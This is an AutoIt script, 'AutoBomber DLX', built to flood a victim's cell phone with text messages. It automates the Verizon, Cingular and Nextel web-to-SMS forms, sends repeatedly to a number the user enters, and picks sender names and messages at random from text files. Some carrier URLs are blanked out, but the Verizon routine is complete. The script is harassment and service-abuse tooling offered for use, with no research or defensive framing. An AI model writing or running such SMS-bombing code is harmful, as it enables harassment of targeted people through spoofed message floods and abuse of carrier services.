#include <GUIConstants.au3>
#include <file.au3>
#include <IE.au3>
GUICreate("AutoBomber DLX", 200, 150)
GUICtrlCreateLabel("Pick Cell Carrier to Autobomb", 30, 10)
$verizon = GUICtrlCreateButton("Verizon", 70, 40, 60)
$cingular = GUICtrlCreateButton("Cingular", 70, 70, 60)
$nextel = GUICtrlCreateButton("Nextel", 70, 100, 60)
GUISetState(@SW_SHOW)
;-------variables----------------------------------------------------------------
Dim $aFrom
Dim $aTo
Dim $aMessage
Dim $Cell_Number
Dim $iNumberOfBombs
Dim $Cell_Carrier
Dim $Message
Dim $From
;--------main loop----------------------------------------------------------------
While 1
  $msg = GUIGetMsg()

  Select
    Case $msg = $verizon
		From_($From)
	Case $msg = $cingular
		From_($From)
	Case $msg = $nextel
		From_($From)
    Case $msg = $GUI_EVENT_CLOSE
      ExitLoop
  EndSelect
WEnd 
;--------------------from----------------------------------------------------------
Func From_($From)
	If Not _FileReadToArray("AutoBomber_from.txt",$aFrom) Then
		MsgBox(4096,"Error", " Error reading log to Array     error:" & @error)
		Exit
	EndIf
	
	For $From = 1 to $aFrom[0]
	Next
	To_($From)
EndFunc
;------------------to-------------------------------------------------------------
Func To_($From)
	Select
		Case $msg = $verizon
			If Not _FileReadToArray("AutoBomber_To_Verizon.txt",$aTo) Then
			MsgBox(4096,"Error", " Error reading from AutoBomber_To_Verizon.txt | error:" & @error)
			Exit
			EndIf
			For $Cell_Carrier = 1 to $aTo[0]
			Next
		Case $msg = $cingular
			If Not _FileReadToArray("AutoBomber_To_Cingular.txt",$aTo) Then
			MsgBox(4096,"Error", " Error reading from AutoBomber_To_Cingular.txt | error:" & @error)
			Exit
			EndIf
			For $Cell_Carrier = 1 to $aTo[0]	
			Next
		Case $msg = $nextel
			If Not _FileReadToArray("AutoBomber_To_Nextel.txt",$aTo) Then
			MsgBox(4096,"Error", " Error reading from AutoBomber_To_Cingular.txt | error:" & @error)
			Exit
			EndIf
			For $Cell_Carrier = 1 to $aTo[0]	
			Next			
	EndSelect
	Msg_($From,$Cell_Carrier)
EndFunc
;---------------msg--------------------------------------------------------------
Func Msg_($From,$Cell_Carrier)
	If Not _FileReadToArray("AutoBomber_msg.txt",$aMessage) Then
		MsgBox(4096,"Error", " Error reading log to Array     error:" & @error)
		Exit
	EndIf
	
	For $Message = 1 to $aMessage[0]
	Next
	Main($From,$Cell_Carrier,$Message)
EndFunc
;------------verizon website interaction-----------------------------------------
Func Verizon($From,$Cell_Carrier,$Message,$Cell_Number)	
	Do
		$oIE = _IECreate()
		_IENavigate($oIE, "www.vtext.com")
		;------------------------------------------------------------------------------------
		$o_form = _IEFormGetObjByName($oIE, "message_form")
		$o_to = _IEFormElementGetObjByName($o_form, "min");        <----Send To
		$o_msg = _IEFormElementGetObjByName($o_form, "text");        <----Message
		$o_from = _IEFormElementGetObjByName($o_form, "subject");        <----From
		;------------------------------------------------------------------------------------
		_IEFormElementSetValue($o_to, $Cell_Number)
		_IEFormElementSetValue($o_msg, $aMessage[Random(1,$Message)])
		_IEFormElementSetValue($o_from, $aFrom[Random(1,$From)])
		Sleep(2000)
		_IEFormSubmit($o_form)
		;-----------page 2(disclaimer)-------------------------------------------------------
		_IELoadWait($oIE)
		$src = "https://www.vtext.com/customer_site/images/buttons/btn_ok.gif"
		$oInputs = _IETagNameGetCollection($oIE.document, "input")
		For $oInput in $oInputs
			If $oInput.type = "image" and $oInput.src = $src Then
				$oInput.click
				ExitLoop
			EndIf
		Next
		_IELoadWait($oIE)
		Sleep(2000)
		_IEQuit($oIE)
		$iNumberOfBombs= $iNumberOfBombs - 1
	Until $iNumberOfBombs <= 0
EndFunc
;-----------cingular website interaction-----------------------------------------
Func Cingular($From,$Cell_Carrier,$Message,$Cell_Number)
	Do
		$oIE = _IECreate()
		_IENavigate($oIE, "                                                      ")
		;------------------------------------------------------------------------------------
		$o_form = _IEFormGetObjByName($oIE, "publicForm")
		$o_from = _IEFormElementGetObjByName($o_form, "from");        <----From
		$o_to = _IEFormElementGetObjByName($o_form, "min");        <----Send To
		$o_msg = _IEFormElementGetObjByName($o_form, "msg");        <----Message
		;------------------------------------------------------------------------------------
		_IEFormElementSetValue($o_from, $aFrom[Random(1,$From)])
		_IEFormElementSetValue($o_to, $Cell_Number)
		_IEFormElementSetValue($o_msg, $aMessage[Random(1,$Message)])
		;Sleep(2000)
		_IEFormSubmit($o_form)
		_IELoadWait($oIE)
		Sleep(2000)
		_IEQuit($oIE)
		$iNumberOfBombs= $iNumberOfBombs - 1
	Until $iNumberOfBombs <= 0
EndFunc
;-----------nextel website interaction-----------------------------------------
Func Nextel($From,$Cell_Carrier,$Message,$Cell_Number)
	Do
		$oIE = _IECreate()
		_IENavigate($oIE, "                                                                    ")
		;------------------------------------------------------------------------------------
		$o_form = _IEFormGetObjByName($oIE, "")
		$o_newnumber = _IEFormElementGetObjByName($o_form, "newnumber");        <----Send To
		_IEFormElementSetValue($o_newnumber, $Cell_Number)
		;------------------------------------------------------------------------------
		$src = "                                                           "
		$oInputs = _IETagNameGetCollection($oIE.document, "input")
		For $oInput in $oInputs
			If $oInput.type = "image" and $oInput.src = $src Then
				$oInput.click
				ExitLoop
			EndIf
		Next
		_IELoadWait($oIE)
		$o_form2 = _IEFormGetObjByName($oIE, "msgForm")
		$o_from = _IEFormElementGetObjByName($o_form2, "from");        <----From
		$o_messsage = _IEFormElementGetObjByName($o_form2, "message");        <----Message
		$o_replynumber = _IEFormElementGetObjByName($o_form2, "replynumber")
		_IEFormElementSetValue($o_from, $aFrom[Random(1,$From)])
		_IEFormElementSetValue($o_messsage, $aMessage[Random(1,$Message)])
		_IEFormElementSetValue($o_replynumber, $Cell_Number)
		;---------------------------------------------------------
		$src = "                                                                    "
		$oInputs = _IETagNameGetCollection($oIE.document, "input")
		For $oInput in $oInputs
			If $oInput.type = "image" and $oInput.src = $src Then
				$oInput.click
				ExitLoop
			EndIf
		Next
		_IELoadWait($oIE)
		Sleep(2000)
		_IEQuit($oIE)
		$iNumberOfBombs= $iNumberOfBombs - 1
	Until $iNumberOfBombs <= 0
EndFunc
;------------------------------main----------------------------------------
Func Main($From,$Cell_Carrier,$Message)
	$Cell_Number=InputBox("-< AutoBomber >-","Cell phone number(s) to bomb?",$aTo[1])
	If $Cell_Number <> $aTo[1] Then 
		$file = FileOpen("AutoBomber_#s.txt", 2)
		If $file = -1 Then
			MsgBox(0, "Error", "Unable to open file.")
			Exit
		EndIf
;MsgBox(0, "Debug", "in file write loop- Writing: " & $Cell_Number)	
		FileWriteLine($file, $Cell_Number)
		FileClose($file)
	EndIf
	
	$iNumberOfBombs=InputBox("-< AutoBomber >-","Number of times to bomb cell?",1)
	
	Select
		Case $msg = $verizon
			Verizon($From,$Cell_Carrier,$Message,$Cell_Number)
		Case $msg = $cingular
			Cingular($From,$Cell_Carrier,$Message,$Cell_Number)
		Case $msg = $nextel
			Nextel($From,$Cell_Carrier,$Message,$Cell_Number)
	EndSelect
EndFunc